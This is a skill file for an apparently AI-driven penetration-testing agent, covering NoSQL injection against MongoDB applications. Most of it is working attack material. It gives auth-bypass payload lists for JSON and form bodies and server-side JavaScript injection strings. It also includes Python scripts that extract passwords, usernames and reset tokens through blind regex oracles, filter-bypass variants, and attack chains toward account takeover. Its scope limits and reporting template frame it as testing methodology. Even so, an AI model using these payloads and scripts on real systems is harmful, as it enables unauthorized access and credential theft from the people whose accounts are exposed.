---
name: nosqli
description: NoSQL Injection (MongoDB operator injection, auth bypass, blind boolean data extraction, server-side JavaScript injection). Use when HauntMode flags NoSQLi as APPLIES/MAYBE, when the app uses MongoDB/document stores, or when JSON body or URL-encoded params could accept MongoDB query operators.
---

# NoSQL Injection (INDEX #10)

Covers MongoDB operator injection, authentication bypass, in-band and blind data extraction, and server-side JavaScript injection (SSJI). Read top-to-bottom on first invocation.

---

## 1. Triggers — when this skill applies

- JSON body parameters in login, search, or lookup endpoints: `{"username":"x","password":"y"}`
- URL-encoded parameters on PHP backends where `param[$op]=val` is valid syntax: `email[$ne]=x`
- Any application that uses MongoDB, CouchDB, or another document store
- `Content-Type: application/json` on auth endpoints
- Error messages mentioning MongoDB, Mongoose, or document store syntax
- Query parameters used for filtering/searching records (tracking numbers, product searches, user lookups)
- Password reset / username check endpoints that return boolean-style responses (available/taken, success/fail)
- Admin panels built on Express/Node.js + MongoDB

---

---

## 3. 30-second triage

Two quick probes to determine if NoSQLi is possible:

**URL-encoded params:**
```
email[$ne]=doesnotexist@x.com&password[$ne]=x
```

**JSON body:**
```json
{"username": {"$ne": "x"}, "password": {"$ne": "x"}}
```

If either returns a successful login or a different response than `username=test&password=test` — the endpoint is injectable via operator injection. Proceed to §5 for full auth bypass or §6 for data extraction.

**SSJI probe (if operator injection fails):**
```
username=" || true || ""=="&password=x
```
or JSON:
```json
{"username": "\" || true || \"\"==\"", "password": "x"}
```

If this logs you in, the backend uses `$where` (SSJI). Proceed to §6.4.

---

## 4. Detection

### 4.1 Identify the content type

- `Content-Type: application/x-www-form-urlencoded` → use `param[$op]=value` syntax
- `Content-Type: application/json` → use `{"param": {"$op": "value"}}` syntax
- Some apps accept both; try switching if one fails

### 4.2 Test each auth/query parameter

For URL-encoded:
```
email[$ne]=1
email[$gt]=
email[$regex]=.*
```

For JSON:
```json
{"email": {"$ne": "1"}}
{"email": {"$gt": ""}}
{"email": {"$regex": ".*"}}
```

### 4.3 For search/lookup endpoints (not auth)

```json
{"trackingNum": {"$ne": "x"}}
{"query": {"$regex": ".*"}}
{"id": {"$gt": ""}}
```

If the response returns records when it shouldn't, injection is confirmed.

### 4.4 Error signature hunting

Try:
```
email[$where]=1==1
{"email": {"$where": "1==1"}}
```

A MongoDB error like `$where is not allowed` or a JS error confirms the backend is MongoDB.

---

## 5. Confirmation — auth bypass payloads

### 5.1 URL-encoded (PHP backends with `param[$op]=val` support)

```
email[$ne]=test@test.com&password[$ne]=test
email[$gt]=&password[$gt]=
email[$gte]=&password[$gte]=
email[$regex]=.*&password[$regex]=.*
email[$lt]=~&password[$lt]=~
email[$exists]=true&password[$exists]=true
email[$not][$eq]=null&password[$not][$eq]=null
```

Target a specific user when username is known:
```
email=admin@example.com&password[$ne]=wrongpassword
email[$eq]=admin@example.com&password[$ne]=null
```

### 5.2 JSON body

```json
{"username": {"$ne": "x"}, "password": {"$ne": "x"}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"username": {"$in": ["admin"]}, "password": {"$ne": ""}}
{"$or": [{"username": "admin"}, {"password": {"$ne": 1}}]}
```

### 5.3 Target a specific account (when username is known)

```json
{"username": "admin", "password": {"$ne": "wrongpassword"}}
{"username": {"$eq": "admin"}, "password": {"$ne": null}}
{"username": "admin@mangomail.com", "password": {"$ne": "x"}}
```

---

## 6. Exploitation

### 6.1 In-band data extraction

If operator injection returns records directly, use `$regex` to enumerate data:
```json
{"trackingNum": {"$regex": "^.*"}}
{"trackingNum": {"$ne": "x"}}
{"q": {"$regex": ".*"}}
```

For login endpoints that return the logged-in user, use `$regex` on the password to extract it:
```json
{"username": "admin", "password": {"$regex": "^a.*"}}
{"username": "admin", "password": {"$regex": "^b.*"}}
```
Binary search through the character set to extract the full value.

### 6.2 Blind boolean data extraction — regex enumeration

Design an oracle based on a binary response (e.g. "success/fail", "available/taken", page length):

```python
import requests, string

URL = "http://target/api/check"

def oracle(regex):
    r = requests.post(URL,
        headers={"Content-Type": "application/json"},
        json={"trackingNum": {"$regex": regex}})
    return "Franz" in r.text  # true indicator for this target

def dump_field(charset=string.ascii_uppercase + string.digits):
    value = ""
    while True:
        found = False
        for c in charset:
            if oracle(f"^{value}{c}.*"):
                value += c
                found = True
                break
        if not found:
            break
    return value
```

Efficiency improvement — use binary search with `$regex` range boundaries:
```python
def oracle_startswith(prefix):
    return oracle(f"^{prefix}.*$")
```

### 6.3 Blind extraction via auth login endpoint

For login endpoints where success = logged in and fail = not logged in:

```python
def oracle(field, regex):
    data = {
        "username": {"$regex": ".*"},  # match any user
        "password": {"$regex": ".*"}
    }
    data[field] = {"$regex": regex}
    r = requests.post(URL, headers={"Content-Type":"application/json"}, json=data)
    return '"success":true' in r.text

def extract(field, charset=string.ascii_letters + string.digits + "_{}"):
    value = ""
    while not value.endswith("}"):
        for c in charset:
            if oracle(field, f"^{value}{c}.*"):
                value += c
                break
    return value
```

### 6.4 Server-Side JavaScript Injection (SSJI)

Used when the app uses `$where` clause with unsanitized user input.

**Auth bypass:**
```
username=" || true || ""=="&password=x
username=" || ""=="&password=" || ""=="
```

JSON equivalent:
```json
{"username": "\" || true || \"\"==\"", "password": "x"}
```

**Blind data extraction via SSJI — `match()` pattern:**
```
# Does any username start with 'H'?
username=" || (this.username.match('^H.*')) || ""=="

# Continue building character by character
username=" || (this.username.match('^HT.*')) || ""=="
username=" || (this.username.match('^HTB.*')) || ""=="
```

**SSJI oracle (Python):**
```python
def oracle(cond_js):
    r = requests.post(URL,
        data=f"username={quote_plus('\" || (' + cond_js + ') || \"\"==\"')}&password=x",
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    return "Logged in" in r.text

# Extract username starting with known prefix
def dump_ssji(known_prefix=""):
    charset = string.ascii_letters + string.digits + "._-@{}"
    value = known_prefix
    while True:
        found = False
        for c in charset:
            if oracle(f'this.username.startsWith("{value}{c}")'):
                value += c
                found = True
                break
        if not found:
            break
    return value
```

**SSJI time-based (where `sleep` is available):**
```json
{"username": {"$where": "sleep(1000) || 1==1"}, "password": "x"}
```

**SSJI field probing (for extracting reset tokens or other hidden fields):**
```python
# Check if user doc has a 'resetToken' field that is non-empty
cond = "this.username==='targetuser' && typeof this.resetToken==='string' && this.resetToken.length>0"
oracle(cond)

# Dump the token prefix by prefix
cond = f"this.username==='targetuser' && this.resetToken.startsWith('{current_prefix}{next_char}')"
```

### 6.5 Advanced: NoSQLMap tool

```
[RUN THIS]
cd ~/CWEE/NoSQLMap && python3 nosqlmap.py
```

---

## 7. Bypass techniques

### 7.1 Bracket syntax variations (URL-encoded)

```
param[$ne]=x           → standard
param[%24ne]=x         → URL-encode the $
param[ne]=x            → some older parsers
```

### 7.2 JSON nested operators

```json
{"param": {"$not": {"$eq": "value"}}}
{"param": {"$nor": [{"$eq": "value"}]}}
```

### 7.3 Switching content type

If `application/json` is rejected, try `application/x-www-form-urlencoded` with bracket syntax (and vice versa). Some Node.js apps accept both via `body-parser`.

### 7.4 Array injection

```json
{"username": ["admin"], "password": ["anyvalue"]}
{"username": {"foo": "bar"}, "password": {"foo": "bar"}}
```

### 7.5 Empty string bypass

```
email[$ne]=&password[$ne]=
```

---

## 8. False-positive checks

- **Application-layer bracket parsing**: some frameworks (Ruby on Rails, PHP) parse `param[key]=val` as `param[key]` = `val` in their own object model without passing it to MongoDB as an operator. Confirm by checking if `$ne` specifically changes the response vs a random key like `$zzz`.
- **Regex anchor confusion**: `$regex: ".*"` matching is very broad — confirm the injection is actually hitting the database query and not triggering a wildcard in the application layer by verifying with a specific non-matching regex like `$regex: "^ZZZZNOTEXIST"` returns empty.
- **SSJI false positive from slow server**: a delay doesn't always mean `sleep()` executed — confirm with `1=1` (delay) vs `1=0` (no delay).
- **Login returning multiple users**: if the operator injection matches multiple documents, the app typically logs you in as the first matched user. This is real injection, not a false positive.
- **CouchDB / Redis**: the same general operator injection concept doesn't apply the same way. Redis has its own injection vectors (command injection via KEYS/SCAN). CouchDB uses Mango query syntax. Adapt accordingly.

---

## 9. Chain candidates

| Chain | Other skill | Impact |
|---|---|---|
| NoSQLi auth bypass → admin access | `idor`, `auth-bypass` | Admin account takeover |
| NoSQLi blind extraction → credential dump | `auth-bypass` | Mass account takeover |
| SSJI field extraction → reset token leak | `auth-bypass` | Password reset hijack |
| NoSQLi on search → data exfiltration | Business logic | PII/sensitive data exposure |
| SSJI with sleep → DoS (time delays) | Informational | Denial of service proof |
| NoSQLi login → session valid → stored XSS context | `xss` | Stored XSS from injected user data |

---

## 10. Reporting template

```
POTENTIAL FINDING: NoSQL Injection — <Operator Injection / Auth Bypass / Blind Extraction / SSJI>
Target: <full URL>
Parameter: <name + location: JSON body / URL-encoded body / query param>
Database: <MongoDB>
Evidence:
    <response showing login success / data returned / regex-confirmed extraction>
Working payload:
    <exact payload — URL-encoded or JSON>
Data extracted (minimal PoC):
    <e.g. first 4 chars of admin password hash confirmed via $regex>
Impact:
    <e.g. Authentication bypass gives admin access | Full blind credential extraction possible>
Next step: <automate extraction script / escalate to admin panel access / chain to IDOR>
```

---

## 11. Recon tracker vector strings

Only log if user explicitly instructs.

- `nosqli:auth-bypass:<param>` — confirmed operator-based auth bypass
- `nosqli:blind-regex:<param>` — confirmed blind data extraction via $regex
- `nosqli:ssji:<param>` — confirmed server-side JS injection
- `nosqli:in-band:<param>` — confirmed in-band data extraction
- `nosqli:no:<param>` — confirmed not injectable (parameterized)

---

## 12. What NOT to do

- **Do not use `$where: "sleep(1000)"` repeatedly** — each execution pauses the MongoDB thread and can DoS the database. Use a single confirmation test; do not loop on it.
- **Do not inject destructive operators** (`$unset`, `$rename`, `$pull`, `$pop`, `$push` to write garbage) on production. Confirm injection with read-only operators only.
- **Do not report `$ne` auth bypass on a hardened app without confirming it works** — some apps explicitly strip or validate operator keys before passing to MongoDB. Always confirm with an actual successful login or data return.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not dump full collections** beyond the minimal PoC needed to prove the finding. One document proving the vulnerability is sufficient.
- **Do not assume SQL blind extraction patterns transfer 1:1** — MongoDB regex extraction is character-set-sensitive and requires URL/JSON encoding of special regex characters (`.`, `*`, `^`, `$` have special meaning).
- **Do not test `$where` SSJI unless you confirm the app uses it** — injecting JS execution payloads against an app that doesn't use `$where` wastes time and may trigger WAF alerts.
